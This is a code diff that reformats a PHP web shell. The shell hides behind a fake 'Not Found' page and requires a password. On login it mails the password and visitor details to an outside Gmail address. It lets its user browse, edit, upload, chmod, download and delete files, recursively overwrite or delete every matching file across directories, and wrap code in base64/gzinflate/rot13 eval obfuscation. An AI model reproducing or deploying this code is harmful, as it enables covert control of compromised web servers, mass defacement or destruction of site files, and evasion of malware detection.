@@ -7,35 +7,55 @@ session_start();
 set_time_limit(0);
 ignore_user_abort(0);
 $password = "49f0bad299687c62334182178bfd75d8";
-function login() {
-?>
+function login()
+{
+    ?>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <h1>Not Found</h1>
-  <p>The request URL <?=$_SERVER['REQUEST_URI']?> was not found on this server.</p>
+  <p>The request URL <?= $_SERVER[
+      'REQUEST_URI'
+  ] ?> was not found on this server.</p>
   <hr>
-  <address><?=$_SERVER['SERVER_SOFTWARE']?> Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
-<?php
-  exit();
+  <address><?= $_SERVER['SERVER_SOFTWARE'] ?> Server at <?= $_SERVER[
+     'HTTP_HOST'
+ ] ?> Port <?= $_SERVER['SERVER_PORT'] ?></address>
+<?php exit();
 }
-if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) {
-  if(empty($password) || (isset($_GET['pass']) && (md5($_GET['pass'])) == $password)) {
-    $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
-    $agent = $_SERVER['HTTP_USER_AGENT']; 
-    $uri = $_SERVER['REQUEST_URI']; 
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $ref = $_SERVER['HTTP_REFERER'];
-    $dtime = date('r'); 
-    $log = "
-            Password : ".$password."\n
-            Time : ".$dtime."\n
-            IP : ".$ip."\n
-            Browser : ".$agent."\n
-            Filename : ".$uri."\n
-            URL : ".$ref."\n";
-    @mail('xnonhack@gmail.com', 'Log', $log);
-  } else {
-    @login();
-  }
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (
+        empty($password) ||
+        (isset($_GET['pass']) && md5($_GET['pass']) == $password)
+    ) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+        $agent = $_SERVER['HTTP_USER_AGENT'];
+        $uri = $_SERVER['REQUEST_URI'];
+        $ip = $_SERVER['REMOTE_ADDR'];
+        $ref = $_SERVER['HTTP_REFERER'];
+        $dtime = date('r');
+        $log =
+            "
+            Password : " .
+            $password .
+            "\n
+            Time : " .
+            $dtime .
+            "\n
+            IP : " .
+            $ip .
+            "\n
+            Browser : " .
+            $agent .
+            "\n
+            Filename : " .
+            $uri .
+            "\n
+            URL : " .
+            $ref .
+            "\n";
+        @mail('xnonhack@gmail.com', 'Log', $log);
+    } else {
+        @login();
+    }
 }
 ?>
 <!DOCTYPE html>
@@ -574,86 +594,107 @@ input[type=radio]:not(old):checked + label > span > span{
 </script>
 <table>
 <?php
-function cwd() {
-  if (isset($_GET['path'])) {
-    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
-    @chdir($cwd);
-  } else {
-    $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
-  } return $cwd;
+function cwd()
+{
+    if (isset($_GET['path'])) {
+        $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, $_GET['path']);
+        @chdir($cwd);
+    } else {
+        $cwd = @str_replace('\\', DIRECTORY_SEPARATOR, @getcwd());
+    }
+    return $cwd;
 }
-function pwd() {
-  $dir = @explode(DIRECTORY_SEPARATOR, @cwd());
-  foreach ($dir as $key => $pwd) {
-    print("<a href='?path=");
-    for ($i=0; $i <= $key ; $i++) { 
-      print($dir[$i]);
-      if ($i != $key) {
-        print(DIRECTORY_SEPARATOR);
-      }
-    } print("'>".$pwd."</a>/");
-  }
+function pwd()
+{
+    $dir = @explode(DIRECTORY_SEPARATOR, @cwd());
+    foreach ($dir as $key => $pwd) {
+        print "<a href='?path=";
+        for ($i = 0; $i <= $key; $i++) {
+            print $dir[$i];
+            if ($i != $key) {
+                print DIRECTORY_SEPARATOR;
+            }
+        }
+        print "'>" . $pwd . "</a>/";
+    }
 }
-function perms($filename) {
-  $perms = fileperms($filename);
+function perms($filename)
+{
+    $perms = fileperms($filename);
 
-switch ($perms & 0xF000) {
-    case 0xC000: // socket
-        $info = 's';
-        break;
-    case 0xA000: // symbolic link
-        $info = 'l';
-        break;
-    case 0x8000: // regular
-        $info = 'r';
-        break;
-    case 0x6000: // block special
-        $info = 'b';
-        break;
-    case 0x4000: // directory
-        $info = 'd';
-        break;
-    case 0x2000: // character special
-        $info = 'c';
-        break;
-    case 0x1000: // FIFO pipe
-        $info = 'p';
-        break;
-    default: // unknown
-        $info = 'u';
+    switch ($perms & 0xf000) {
+        case 0xc000: // socket
+            $info = 's';
+            break;
+        case 0xa000: // symbolic link
+            $info = 'l';
+            break;
+        case 0x8000: // regular
+            $info = 'r';
+            break;
+        case 0x6000: // block special
+            $info = 'b';
+            break;
+        case 0x4000: // directory
+            $info = 'd';
+            break;
+        case 0x2000: // character special
+            $info = 'c';
+            break;
+        case 0x1000: // FIFO pipe
+            $info = 'p';
+            break;
+        default:
+            // unknown
+            $info = 'u';
+    }
+
+    // Owner
+    $info .= $perms & 0x0100 ? 'r' : '-';
+    $info .= $perms & 0x0080 ? 'w' : '-';
+    $info .=
+        $perms & 0x0040
+            ? ($perms & 0x0800
+                ? 's'
+                : 'x')
+            : ($perms & 0x0800
+                ? 'S'
+                : '-');
+
+    // Group
+    $info .= $perms & 0x0020 ? 'r' : '-';
+    $info .= $perms & 0x0010 ? 'w' : '-';
+    $info .=
+        $perms & 0x0008
+            ? ($perms & 0x0400
+                ? 's'
+                : 'x')
+            : ($perms & 0x0400
+                ? 'S'
+                : '-');
+
+    // World
+    $info .= $perms & 0x0004 ? 'r' : '-';
+    $info .= $perms & 0x0002 ? 'w' : '-';
+    $info .=
+        $perms & 0x0001
+            ? ($perms & 0x0200
+                ? 't'
+                : 'x')
+            : ($perms & 0x0200
+                ? 'T'
+                : '-');
+
+    return $info;
 }
-
-// Owner
-$info .= (($perms & 0x0100) ? 'r' : '-');
-$info .= (($perms & 0x0080) ? 'w' : '-');
-$info .= (($perms & 0x0040) ?
-            (($perms & 0x0800) ? 's' : 'x' ) :
-            (($perms & 0x0800) ? 'S' : '-'));
-
-// Group
-$info .= (($perms & 0x0020) ? 'r' : '-');
-$info .= (($perms & 0x0010) ? 'w' : '-');
-$info .= (($perms & 0x0008) ?
-            (($perms & 0x0400) ? 's' : 'x' ) :
-            (($perms & 0x0400) ? 'S' : '-'));
-
-// World
-$info .= (($perms & 0x0004) ? 'r' : '-');
-$info .= (($perms & 0x0002) ? 'w' : '-');
-$info .= (($perms & 0x0001) ?
-            (($perms & 0x0200) ? 't' : 'x' ) :
-            (($perms & 0x0200) ? 'T' : '-'));
-
-return $info;
+function permission($filename, $perms)
+{
+    if (
+        is_writable($filename)
+    ) { ?> <font color="green"><?php print $perms; ?></font> <?php } else { ?> <font color="red"><?php print $perms; ?></font> <?php }
 }
-function permission($filename, $perms) {
-  if (is_writable($filename)) {
-    ?> <font color="green"><?php print $perms ?></font> <?php
-  } else {
-    ?> <font color="red"><?php print $perms ?></font> <?php
-  }
-}
-function size($file) {
+function size($file)
+{
     $bytes = @filesize($file);
     if ($bytes >= 1073741824) {
         return @number_format($bytes / 1073741824, 2) . ' GB';
@@ -669,38 +710,41 @@ function size($file) {
         return '0 bytes';
     }
 }
-function success($text) {
-  ?>
+function success($text)
+{
+    ?>
   <center>
   <div class="alert alert-success" role="alert">
-    <?php print $text ?>
+    <?php print $text; ?>
   </div>
   </center>
   <?php
 }
-function failed($text) {
-  ?>
+function failed($text)
+{
+    ?>
   <center>
   <div class="alert alert-danger" role="alert">
-    <?php print $text ?>
+    <?php print $text; ?>
   </div>
   </center>
   <?php
 }
-function makefile($filename, $text) {
-  $fp = @fopen($filename, "w");
-  @fwrite($fp, $text);
-  @fclose($fp);
+function makefile($filename, $text)
+{
+    $fp = @fopen($filename, "w");
+    @fwrite($fp, $text);
+    @fclose($fp);
 }
-function makedir($filename) {
-  return @mkdir($filename);
+function makedir($filename)
+{
+    return @mkdir($filename);
 }
-if (isset($_GET['encode'])) {
-    ?>
+if (isset($_GET['encode'])) { ?>
     <thead>
       <tr>
         <th colspan="2">
-          <a class="back" href="?path=<?php print @cwd() ?>">ENCODE</a>
+          <a class="back" href="?path=<?php print @cwd(); ?>">ENCODE</a>
         </th>
       </tr>
     </thead>
@@ -730,53 +774,64 @@ if (isset($_GET['encode'])) {
     </form>
     <?php
     if (isset($_POST['submit'])) {
-      encode($_POST['text'], $_POST['mode']);
+        encode($_POST['text'], $_POST['mode']);
     }
     exit();
-}
-function encode($text, $mode) {
-  switch ($mode) {
-    case 'base64' : $codi = base64_encode($text);
-      $codi = "<?php eval('?>'.base64_decode('$codi'));";
-      break;
-    case 'str': $codi = base64_encode(str_rot13(gzdeflate(str_rot13($text))));
-      $codi = "<?php eval('?>'.str_rot13(gzinflate(str_rot13(base64_decode('$codi')))));";
-      break;
-    case 'gzinflate': $codi = base64_encode(gzdeflate(str_rot13($text)));
-      $codi = "<?php eval('?>'.str_rot13(gzinflate(base64_decode('$codi'))));";
-      break;
-    case 'gzinflates': $codi = base64_encode(gzdeflate($text));
-      $codi="<?php eval('?>'.gzinflate(base64_decode('$codi')));";
-      break;
-    case 'str2': $codi=base64_encode(str_rot13($text));
-      $codi="<?php eval('?>'.str_rot13(base64_decode('$codi')));";
-      break;
-    case 'urlencode': $codi = rawurlencode($text);
-      $codi = "<?php eval('?>'.rawurldecode('$codi'));";
-      break;
-    case 'ur' : $codi = base64_encode(convert_uuencode($text));
-      $codi="<?php eval('?>'.convert_uudecode(base64_decode('$codi')));";
-      break;
-    case 'url' : $codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
-      $codi="<?php eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode('$codi')))))));";
-      break;
-  }
-  ?>
+    }
+function encode($text, $mode)
+{
+    switch ($mode) {
+        case 'base64':
+            $codi = base64_encode($text);
+            $codi = "<?php eval('?>'.base64_decode('$codi'));";
+            break;
+        case 'str':
+            $codi = base64_encode(str_rot13(gzdeflate(str_rot13($text))));
+            $codi = "<?php eval('?>'.str_rot13(gzinflate(str_rot13(base64_decode('$codi')))));";
+            break;
+        case 'gzinflate':
+            $codi = base64_encode(gzdeflate(str_rot13($text)));
+            $codi = "<?php eval('?>'.str_rot13(gzinflate(base64_decode('$codi'))));";
+            break;
+        case 'gzinflates':
+            $codi = base64_encode(gzdeflate($text));
+            $codi = "<?php eval('?>'.gzinflate(base64_decode('$codi')));";
+            break;
+        case 'str2':
+            $codi = base64_encode(str_rot13($text));
+            $codi = "<?php eval('?>'.str_rot13(base64_decode('$codi')));";
+            break;
+        case 'urlencode':
+            $codi = rawurlencode($text);
+            $codi = "<?php eval('?>'.rawurldecode('$codi'));";
+            break;
+        case 'ur':
+            $codi = base64_encode(convert_uuencode($text));
+            $codi = "<?php eval('?>'.convert_uudecode(base64_decode('$codi')));";
+            break;
+        case 'url':
+            $codi = base64_encode(
+                gzdeflate(
+                    convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))
+                )
+            );
+            $codi = "<?php eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode('$codi')))))));";
+            break;
+    } ?>
   <tr>
     <td colspan="2">
       <textarea readonly><?= $codi ?></textarea>
     </td>
   </tr>
-  <?php
-  exit();
+  <?php exit();
 }
-function masswriter($post) {
-  if ($_GET['do'] == 'masswrite') {
-      ?>
+function masswriter($post)
+{
+    if ($_GET['do'] == 'masswrite') { ?>
   <thead>
       <tr>
         <th>
-          <a class="back" href="?path=<?php print @cwd() ?>">REPLACE FILE</a>
+          <a class="back" href="?path=<?php print @cwd(); ?>">REPLACE FILE</a>
         </th>
       </tr>
     </thead>
@@ -793,7 +848,7 @@ function masswriter($post) {
     </tr>
     <tr>
       <td>
-        <input style="width:98.9%;" type="text" name="dir" value="<?php print @cwd() ?>">
+        <input style="width:98.9%;" type="text" name="dir" value="<?php print @cwd(); ?>">
         
       </td>
     </tr>
@@ -815,181 +870,221 @@ function masswriter($post) {
   </form>
   <?php
   if (isset($_POST['submit'])) {
-    if ($_POST['mode'] == 'masswrite') {
-      @masswrite($_POST['dir'], $_POST['type'], $_POST['text']);
-    }
-    if ($_POST['mode'] == 'massdelete') {
-      @massdelete($_POST['dir'], $_POST['type']);
-    }
+      if ($_POST['mode'] == 'masswrite') {
+          @masswrite($_POST['dir'], $_POST['type'], $_POST['text']);
+      }
+      if ($_POST['mode'] == 'massdelete') {
+          @massdelete($_POST['dir'], $_POST['type']);
+      }
   }
   exit();
   }
 }
-function masswrite($dir, $type, $text) {
-    if(is_writable($dir)) {
+function masswrite($dir, $type, $text)
+{
+    if (is_writable($dir)) {
         $getfile = scandir($dir);
-        foreach($getfile as $file) {
-            $path = $dir.DIRECTORY_SEPARATOR.$file;
-            if($file === '.' || filetype($path) == 'file') {
-                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
-                    ?>
+        foreach ($getfile as $file) {
+            $path = $dir . DIRECTORY_SEPARATOR . $file;
+            if ($file === '.' || filetype($path) == 'file') {
+                if (
+                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
+                        0 &&
+                    @preg_match(
+                        "/" . $file . "$/",
+                        $_SERVER['PHP_SELF'],
+                        $matches
+                    ) != 1
+                ): ?>
                     <tr>
                         <td>
                             <div class="alert alert-success">
-                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Rewrite Successfully !</b>
+                                <?= $dir .
+                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Rewrite Successfully !</b>
                             </div>
                         </td>
                     </tr>
-                    <?php
-                file_put_contents($path, $text);
-                endif;
-            } elseif($file === '..' || filetype($path) == 'file') {
-                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
-                    ?>
+                    <?php file_put_contents($path, $text);endif;
+            } elseif ($file === '..' || filetype($path) == 'file') {
+                if (
+                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
+                        0 &&
+                    @preg_match(
+                        "/" . $file . "$/",
+                        $_SERVER['PHP_SELF'],
+                        $matches
+                    ) != 1
+                ): ?>
                     <tr>
                         <td>
                             <div class="alert alert-success">
-                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Rewrite Successfully !</b>
+                                <?= $dir .
+                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Rewrite Successfully !</b>
                             </div>
                         </td>
                     </tr>
-                    <?php
-                file_put_contents($path, $text);
-                endif;
+                    <?php file_put_contents($path, $text);endif;
             } else {
-                if(is_dir($path)) {
-                    if(is_writable($path)) {
+                if (is_dir($path)) {
+                    if (is_writable($path)) {
                         @file_put_contents($path, $text);
-                        masswrite($path,$type,$text);
+                        masswrite($path, $type, $text);
                     }
                 }
             }
         }
     }
 }
-function massdelete($dir, $type) {
-    if(is_writable($dir)) {
+function massdelete($dir, $type)
+{
+    if (is_writable($dir)) {
         $getfile = scandir($dir);
-        foreach($getfile as $file) {
-            $path = $dir.DIRECTORY_SEPARATOR.$file;
-            if($file === '.' || filetype($path) == 'file') {
-                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
-                    ?>
+        foreach ($getfile as $file) {
+            $path = $dir . DIRECTORY_SEPARATOR . $file;
+            if ($file === '.' || filetype($path) == 'file') {
+                if (
+                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
+                        0 &&
+                    @preg_match(
+                        "/" . $file . "$/",
+                        $_SERVER['PHP_SELF'],
+                        $matches
+                    ) != 1
+                ): ?>
                     <tr>
                         <td>
                             <div class="alert alert-success">
-                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Delete Successfully !</b>
+                                <?= $dir .
+                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Delete Successfully !</b>
                             </div>
                         </td>
                     </tr>
-                    <?php
-                unlink($path);
-                endif;
-            } elseif($file === '..' || filetype($path) == 'file') {
-                if ((@preg_match("/".$type."$"."/", $file, $matches) != 0) && (@preg_match("/".$file."$/", $_SERVER['PHP_SELF'], $matches) != 1)):
-                    ?>
+                    <?php unlink($path);endif;
+            } elseif ($file === '..' || filetype($path) == 'file') {
+                if (
+                    @preg_match("/" . $type . "$" . "/", $file, $matches) !=
+                        0 &&
+                    @preg_match(
+                        "/" . $file . "$/",
+                        $_SERVER['PHP_SELF'],
+                        $matches
+                    ) != 1
+                ): ?>
                     <tr>
                         <td>
                             <div class="alert alert-success">
-                                <?= $dir.DIRECTORY_SEPARATOR ?><b><?=$file ?> Delete Successfully !</b>
+                                <?= $dir .
+                                    DIRECTORY_SEPARATOR ?><b><?= $file ?> Delete Successfully !</b>
                             </div>
                         </td>
                     </tr>
-                    <?php
-                unlink($path);
-                endif;
+                    <?php unlink($path);endif;
             } else {
-                if(is_dir($path)) {
-                    if(is_writable($path)) {
+                if (is_dir($path)) {
+                    if (is_writable($path)) {
                         @unlink($path);
-                        massdelete($path,$type);
+                        massdelete($path, $type);
                     }
                 }
             }
         }
     }
 }
-function making($post) {
-  if ($_GET['do'] == 'making') {
-    ?>
+function making($post)
+{
+    if ($_GET['do'] == 'making') { ?>
     <thead>
       <tr>
         <th colspan="2">
-          <a class="back" href="?path=<?php print @cwd() ?>">MAKE FILE & DIRECTORY</a>
+          <a class="back" href="?path=<?php print @cwd(); ?>">MAKE FILE & DIRECTORY</a>
         </th>
       </tr>
     </thead>
-    <?php
-    if (isset($_POST['submit'])) {
-      if ($_POST['type'] == 'file') {
-        switch ($_POST['file_name']) {
-          case 'txt':
-            $_mode = "txt";
-            break;
-          case 'html':
-            $_mode = "html";
-            break;
-          case 'php':
-            $_mode = "php";
-            break;
-          case 'css':
-            $_mode = "css";
-            break;
-          case 'asp':
-            $_mode = "asp";
-            break;
-          case 'js':
-            $_mode = "js";
-            break;
-          case 'python':
-            $_mode = "py";
-            break;
-          case 'perl':
-            $_mode = "pl";
-            break;
-        }
-        if (@makefile($_POST['filename'].".".$_mode, $_POST['text'])) {
-          ?>
+    <?php if (isset($_POST['submit'])) {
+        if ($_POST['type'] == 'file') {
+            switch ($_POST['file_name']) {
+                case 'txt':
+                    $_mode = "txt";
+                    break;
+                case 'html':
+                    $_mode = "html";
+                    break;
+                case 'php':
+                    $_mode = "php";
+                    break;
+                case 'css':
+                    $_mode = "css";
+                    break;
+                case 'asp':
+                    $_mode = "asp";
+                    break;
+                case 'js':
+                    $_mode = "js";
+                    break;
+                case 'python':
+                    $_mode = "py";
+                    break;
+                case 'perl':
+                    $_mode = "pl";
+                    break;
+            }
+            if (
+                @makefile($_POST['filename'] . "." . $_mode, $_POST['text'])
+            ) { ?>
           <tr>
             <td colspan="2">
-              <?php print @failed("Create File <b>".$_POST['filename'].".".$_mode."</b> Failed") ?>
+              <?php print @failed(
+                  "Create File <b>" .
+                      $_POST['filename'] .
+                      "." .
+                      $_mode .
+                      "</b> Failed"
+              ); ?>
             </td>
           </tr>
-          <?php
-        } else {
-          ?>
+          <?php } else { ?>
           <tr>
             <td colspan="2">
-              <?php print @success("Create File <b>".$_POST['filename'].".".$_mode."</b> Successfully") ?>
+              <?php print @success(
+                  "Create File <b>" .
+                      $_POST['filename'] .
+                      "." .
+                      $_mode .
+                      "</b> Successfully"
+              ); ?>
             </td>
           </tr>
-          <?php
+          <?php }
         }
-      }
-      if ($_POST['type'] == 'dir') {
-        if (@makedir($_POST['filename'])) {
-          ?>
+        if ($_POST['type'] == 'dir') {
+            if (@makedir($_POST['filename'])) { ?>
           <tr>
             <td>
-              <?php print @success("Create DIRECTORY ".$_POST['filename']." Successfully") ?>
+              <?php print @success(
+                  "Create DIRECTORY " . $_POST['filename'] . " Successfully"
+              ); ?>
               <?php print sleep(7); ?>
               <?php print flush(); ?>
-              <?php print @header("Location : ?path=".@cwd().DIRECTORY_SEPARATOR.$_POST['filename']."") ?>
+              <?php print @header(
+                  "Location : ?path=" .
+                      @cwd() .
+                      DIRECTORY_SEPARATOR .
+                      $_POST['filename'] .
+                      ""
+              ); ?>
             </td>
           </tr>
-          <?php
-        } else {
-          ?>
+          <?php } else { ?>
           <tr>
             <td>
-              <?php print @failed("Create DIRECTORY ".$_POST['filename']." Failed") ?>
+              <?php print @failed(
+                  "Create DIRECTORY " . $_POST['filename'] . " Failed"
+              ); ?>
             </td>
           </tr>
-          <?php
+          <?php }
         }
-      }
-    }
-    ?>
+    } ?>
     <form method="post">
       <tr>
         <td colspan="2">
@@ -1029,58 +1124,58 @@ function making($post) {
         </td>
       </tr>
     </form>
-    <?php
-    exit();
-  }
+    <?php exit();}
 }
-function upload($post) {
-  if ($_GET['do'] == $post) {
-    if (isset($_POST['submit'])) {
-      if ($_POST['type'] == 'biasa') {
-        if (@copy($_FILES['file']['tmp_name'], @cwd().DIRECTORY_SEPARATOR.$_FILES['file']['name'])) {
-          ?>
+function upload($post)
+{
+    if ($_GET['do'] == $post) {
+        if (isset($_POST['submit'])) {
+            if ($_POST['type'] == 'biasa') {
+                if (
+                    @copy(
+                        $_FILES['file']['tmp_name'],
+                        @cwd() . DIRECTORY_SEPARATOR . $_FILES['file']['name']
+                    )
+                ) { ?>
           <tr>
             <td>
-              <?php print @success("Upload Success") ?>
+              <?php print @success("Upload Success"); ?>
             </td>
           </tr>
-          <?php
-        } else {
-          ?>
+          <?php } else { ?>
           <tr>
             <td>
-              <?php print @failed("Upload Failed") ?>
+              <?php print @failed("Upload Failed"); ?>
             </td>
           </tr>
-          <?php
-        }
-      }
-      if ($_POST['type'] == 'root') {
-        $root = $_SERVER['DOCUMENT_ROOT'];
-        if (@copy($_FILES['file']['tmp_name'], $root.DIRECTORY_SEPARATOR.$_FILES['file']['name'])) {
-          ?>
+          <?php }
+            }
+            if ($_POST['type'] == 'root') {
+                $root = $_SERVER['DOCUMENT_ROOT'];
+                if (
+                    @copy(
+                        $_FILES['file']['tmp_name'],
+                        $root . DIRECTORY_SEPARATOR . $_FILES['file']['name']
+                    )
+                ) { ?>
           <tr>
             <td>
-              <?php print @success("Upload Success") ?>
+              <?php print @success("Upload Success"); ?>
             </td>
           </tr>
-          <?php
-        } else {
-          ?>
+          <?php } else { ?>
           <tr>
             <td>
-              <?php print @failed("Upload Failed") ?>
+              <?php print @failed("Upload Failed"); ?>
             </td>
           </tr>
-          <?php
-        }
-      }
-    }
-    ?>
+          <?php }
+            }
+        } ?>
     <thead>
         <tr>
           <th>
-            <a class="back" href="?path=<?php print @cwd() ?>">UPLOAD FILE</a>
+            <a class="back" href="?path=<?php print @cwd(); ?>">UPLOAD FILE</a>
           </th>
         </tr>
       </thead>
@@ -1090,11 +1185,11 @@ function upload($post) {
           <div align="center">
             <input id="option" type="radio" name="type" value="biasa" checked="checked">
             <label for="option"><span><span></span></span>biasa
-            ( <?php print @permission(@cwd(), "Writable") ?> )
+            ( <?php print @permission(@cwd(), "Writable"); ?> )
             </label>
             <input id="option" type="radio" name="type" value="root">
             <label for="option"><span><span></span></span>home_root
-            ( <?php print @permission($_SERVER['DOCUMENT_ROOT'], "Writable") ?>
+            ( <?php print @permission($_SERVER['DOCUMENT_ROOT'], "Writable"); ?>
             </label>
         </div>
         </td>
@@ -1108,47 +1203,48 @@ function upload($post) {
         </td>
       </tr>
     </form>
-    <?php
-    exit();
-  }
+    <?php exit();
+    }
 }
-function edit($post, $filename) {
-  if ($_GET['do'] == $post) {
-    if (isset($_POST['submit'])) {
-      $fp = @fopen($filename, "w");
-      if (@fwrite($fp, $_POST['text'])) {
-        ?>
+function edit($post, $filename)
+{
+    if ($_GET['do'] == $post) {
+
+        if (isset($_POST['submit'])) {
+            $fp = @fopen($filename, "w");
+            if (@fwrite($fp, $_POST['text'])) { ?>
         <tr>
             <td>
-                <?php print @success("Saved") ?>
+                <?php print @success("Saved"); ?>
             </td>
         </tr>
-        <?php
-      } else {
-        ?>
+        <?php } else { ?>
         <tr>
             <td>
-                <?php print @failed("Failed") ?>
+                <?php print @failed("Failed"); ?>
             </td>
         </tr>
-        <?php
-      }
-    } $text = @htmlspecialchars(@file_get_contents($filename));
-    ?>
+        <?php }
+        }
+        $text = @htmlspecialchars(@file_get_contents($filename));
+        ?>
     <thead>
       <tr>
         <th>
-          <a class="back" href="?path=<?php print @cwd() ?>">EDIT</a>
+          <a class="back" href="?path=<?php print @cwd(); ?>">EDIT</a>
         </th>
       </tr>
       <tr>
-        <th>Filename : <?php print @permission($filename, @basename($filename)) ?></th>
+        <th>Filename : <?php print @permission(
+            $filename,
+            @basename($filename)
+        ); ?></th>
       </tr>
     </thead>
     <form method="post">
       <tr>
         <td>
-          <textarea name="text"><?php print $text ?></textarea>
+          <textarea name="text"><?php print $text; ?></textarea>
         </td>
       </tr>
       <tr>
@@ -1157,43 +1253,40 @@ function edit($post, $filename) {
         </td>
       </tr>
     </form>
-    <?php
-    exit();
-  }
-}
-function renames($post, $filename) {
-  if ($_GET['do'] == $post) {
-    if (isset($_POST['submit'])) {
-      if (@rename($filename, $_POST['newname'])) {
-        ?>
-        <tr>
-            <td>
-                <?php print @success("Rename Success") ?>
-            </td>
-        </tr>
-        <?php
-      } else {
-        ?>
-        <tr>
-            <td>
-                <?php print @failed("Rename Failed") ?>
-            </td>
-        </tr>
-        <?php
-      }
+    <?php exit();
     }
-    ?>
+}
+function renames($post, $filename)
+{
+    if ($_GET['do'] == $post) {
+        if (isset($_POST['submit'])) {
+            if (@rename($filename, $_POST['newname'])) { ?>
+        <tr>
+            <td>
+                <?php print @success("Rename Success"); ?>
+            </td>
+        </tr>
+        <?php } else { ?>
+        <tr>
+            <td>
+                <?php print @failed("Rename Failed"); ?>
+            </td>
+        </tr>
+        <?php }
+        } ?>
     <thead>
       <tr>
         <th>
-          <a class="back" href="?path=<?php print @cwd() ?>">RENAME</a>
+          <a class="back" href="?path=<?php print @cwd(); ?>">RENAME</a>
         </th>
       </tr>
     </thead>
     <form method="post">
       <tr>
         <td>
-          <input style="width:98.6%;" type="text" name="newname" value="<?php print @basename($filename) ?>">
+          <input style="width:98.6%;" type="text" name="newname" value="<?php print @basename(
+              $filename
+          ); ?>">
         </td>
       </tr>
       <tr>
@@ -1202,43 +1295,41 @@ function renames($post, $filename) {
         </td>
       </tr>
     </form>
-    <?php
-    exit();
-  }
-}
-function chmods($post, $filename) {
-  if ($_GET['do'] == $post) {
-    if (isset($_POST['submit'])) {
-      if (@chmod($filename, $_POST['mode'])) {
-        ?>
-        <tr>
-            <td>
-                <?php print @success("Chmod Success") ?>
-            </td>
-        </tr>
-        <?php
-      } else { 
-        ?>
-        <tr>
-            <td>
-                <?php print @failed("Chmod Failed") ?>
-            </td>
-        </tr>
-        <?php
-      }
+    <?php exit();
     }
-    ?>
+}
+function chmods($post, $filename)
+{
+    if ($_GET['do'] == $post) {
+        if (isset($_POST['submit'])) {
+            if (@chmod($filename, $_POST['mode'])) { ?>
+        <tr>
+            <td>
+                <?php print @success("Chmod Success"); ?>
+            </td>
+        </tr>
+        <?php } else { ?>
+        <tr>
+            <td>
+                <?php print @failed("Chmod Failed"); ?>
+            </td>
+        </tr>
+        <?php }
+        } ?>
     <thead>
       <tr>
         <th>
-          <a class="back" href="?path=<?php print @cwd() ?>">CHANGE MODE</a>
+          <a class="back" href="?path=<?php print @cwd(); ?>">CHANGE MODE</a>
         </th>
       </tr>
     </thead>
     <form method="post">
       <tr>
         <td>
-          <input style="width:98.5%;" type="text" name="mode" value="<?php print @substr(sprintf('%o', @fileperms($filename)), -4) ?>">
+          <input style="width:98.5%;" type="text" name="mode" value="<?php print @substr(
+              sprintf('%o', @fileperms($filename)),
+              -4
+          ); ?>">
         </td>
       </tr>
       <tr>
@@ -1247,99 +1338,107 @@ function chmods($post, $filename) {
         </td>
       </tr>
     </form>
-    <?php
-    exit();
-  }
+    <?php exit();
+    }
 }
-function delete($filename) {
-  if (@is_dir($filename)) {
-    $scandir = @scandir($filename);
-    foreach ($scandir as $object) {
-      if ($object != '.' && $object != '..') {
-        if (@is_dir($filename.DIRECTORY_SEPARATOR.$object)) {
-          @delete($filename.DIRECTORY_SEPARATOR.$object);
-        } else {
-          @unlink($filename.DIRECTORY_SEPARATOR.$object);
+function delete($filename)
+{
+    if (@is_dir($filename)) {
+        $scandir = @scandir($filename);
+        foreach ($scandir as $object) {
+            if ($object != '.' && $object != '..') {
+                if (@is_dir($filename . DIRECTORY_SEPARATOR . $object)) {
+                    @delete($filename . DIRECTORY_SEPARATOR . $object);
+                } else {
+                    @unlink($filename . DIRECTORY_SEPARATOR . $object);
+                }
+            }
         }
-      }
-    } if (@rmdir($filename)) {
-      return true;
+        if (@rmdir($filename)) {
+            return true;
+        } else {
+            return false;
+        }
     } else {
-      return false;
+        if (@unlink($filename)) {
+            return true;
+        } else {
+            return false;
+        }
     }
-  } else {
-    if (@unlink($filename)) {
-      return true;
-    } else {
-      return false;
+}
+function download($post, $filename)
+{
+    if ($_GET['do'] == $post) {
+        @ob_clean();
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header(
+            'Content-Disposition: attachment; filename="' .
+                basename($filename) .
+                '"'
+        );
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($filename));
+        readfile($filename);
+
+        @readfile($filename);
+        exit(0);
     }
-  }
 }
-function download($post, $filename) {
-  if ($_GET['do'] == $post) {
-    @ob_clean();
-    header('Content-Description: File Transfer');
-    header('Content-Type: application/octet-stream');
-    header('Content-Disposition: attachment; filename="'.basename($filename).'"');
-    header('Expires: 0');
-    header('Cache-Control: must-revalidate');
-    header('Pragma: public');
-    header('Content-Length: ' . filesize($filename));
